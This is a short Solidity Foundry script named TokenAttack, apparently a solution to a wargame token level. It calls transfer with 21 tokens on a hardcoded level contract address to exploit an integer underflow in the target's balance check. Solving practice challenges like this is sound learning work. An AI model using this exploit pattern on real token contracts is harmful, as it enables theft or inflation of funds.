//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../../src/token/Token.sol";

contract TokenAttack is Script {

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address level = 0x56B57f84988Db92285CAcD16D7666aEAD80b72d4;
        Token token = Token(level);
        token.transfer(address(1), 21);
    }
}